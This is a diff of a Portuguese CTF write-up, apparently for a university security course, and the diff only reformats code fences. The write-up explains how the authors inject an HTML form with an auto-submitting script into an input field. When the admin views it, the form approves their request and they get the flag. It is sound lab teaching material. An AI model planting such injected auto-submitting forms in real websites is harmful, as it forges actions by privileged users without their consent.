@@ -3,15 +3,18 @@
 Começamos por entrar no site e instantaneamente nos deparamos com informação que vamos precisar de usar mais tarde, o id da request que vai ser realizada.
 Com esta informação em mente, inserimos um texto qualquer no input para ver onde nos levaria e após alguns cliques chegamos a http://ctf-fsi.fe.up.pt:5005, a página onde o admin realiza a avaliação dos inputs.
 Após analisarmos o código da página, descobrimos que o código usado para o botão Give The Flag é o seguinte, em que (id) representa o id da  request:
-```<form method="POST" action="request/(id)/approve" role="form">
+```
+<form method="POST" action="request/(id)/approve" role="form">
     <div class="submit">
         
         <input type="submit" id="giveflag" value="Give the flag" disable="">
         
     </div>
-</form>```
+</form>
+```
 Utilizando este código juntamente com algum conhecimento de javascript fizemos o seguinte código que após ler a parte de javascript submete o form e nos dará a flag do desafio:
-```<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/(id)/approve" role="form">
+```
+<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/(id)/approve" role="form">
     <div class="submit">
         
         <input type="submit" id="giveflag" value="Give the flag">
@@ -20,5 +23,6 @@ Utilizando este código juntamente com algum conhecimento de javascript fizemos 
     <script>
         document.forms[0].submit();
     </script>
-</form>```
+</form>
+```
 Inserindo este código na zona de input após termos desativado a permição de usar javascript do site, para evitar sermos redirecionados para uma página à qual não temos acesso, somos então redirecionados para a página de avaliação do input, na qual ainda não está presente a flag devido ao site não ter atualizado por não ter acesso a javascript. Após um reload rápido, a flag que pretendiamos obter está presente no topo da página.
